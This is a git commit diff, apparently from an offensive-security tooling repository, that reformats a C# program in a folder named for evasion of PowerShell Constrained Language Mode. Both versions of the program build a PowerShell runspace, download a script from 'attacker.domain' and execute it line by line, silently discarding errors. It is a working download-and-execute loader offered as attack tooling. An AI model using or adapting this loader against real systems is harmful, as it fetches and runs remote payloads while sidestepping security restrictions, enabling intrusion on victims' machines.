69161802e2775f7739f43662bba2d9a7fd9b9a1d
basedgutta <71115010+basedgutta@users.noreply.github.com>
2021-02-17 18:17:18 -0500

    Update download_and_execute_ps.cs

--- Evasion/clm/download_and_execute_ps.cs
+++ Evasion/clm/download_and_execute_ps.cs
@@ -5,28 +5,28 @@ using System.Management.Automation.Host;
 using System.Management.Automation.Runspaces;
 using PowerShell = System.Management.Automation.PowerShell;
 
-namespace powershell
+namespace Powershell
 {
 	class Program
     {
         static void Main(string[] args)
         {
-			    PowerShell Ps_instance = PowerShell.Create();
+			PowerShell Ps_instance = PowerShell.Create();
 
-			    WebClient myWebClient = new WebClient();
-			    try {
-          var script1 = myWebClient.DownloadString("http://attacker.domain/script.txt");
-          string[] array = script1.Split('\n');
-          foreach (string value in array)
-          {
-            Ps_instance.AddScript(value);
-          }
-        } catch{
-        }
- 
-        Ps_instance.AddCommand("out-string");
-        Ps_instance.Invoke();
+			WebClient myWebClient = new WebClient();
+			try {
+				var script1 = myWebClient.DownloadString("http://attacker.domain/folder/script.txt");
+				string[] array = script1.Split('\n');
+				foreach (string value in array)
+				{
+					Ps_instance.AddScript(value);
+				}
+			} catch{
+			}
+			
+			Ps_instance.AddCommand("out-string");
+			Ps_instance.Invoke();
 
-		  }
+		}
     }
 }
